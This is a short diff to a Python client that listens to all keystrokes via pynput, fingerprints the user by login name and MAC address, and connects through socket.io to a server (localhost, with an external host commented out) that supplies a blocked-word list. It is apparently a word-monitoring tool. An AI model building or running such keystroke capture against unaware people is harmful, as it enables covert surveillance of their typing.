@@ -1,4 +1,5 @@
 import json
+import uuid
 import time
 import tkinter as tk
 from tkinter import messagebox
@@ -11,7 +12,9 @@ blocked_words = []   # Global - always updated by the server
 
 sio = socketio.Client()
 
-client_id = os.path.expanduser('~').split('\\')[-1]  # Adjust for your OS if needed
+username = os.getlogin()
+mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
+client_id = f"{username}_{mac_addr}"
 
 key_buffer = ''
 
@@ -103,14 +106,13 @@ def main():
         print("Waiting for blocked word list from server...")
 
     try:
-        sio.connect('http://127.0.0.1:5000')
+        # sio.connect('https://anything.anokxz.in')
+        sio.connect('http://localhost:5000')
     except Exception as e:
         print(f"Failed to connect to server: {e}")
 
     with pynput_keyboard.Listener(on_press=on_press) as listener:
         listener.join()
-    while True:
-        time.sleep(1)
 
 if __name__ == '__main__':
     main()
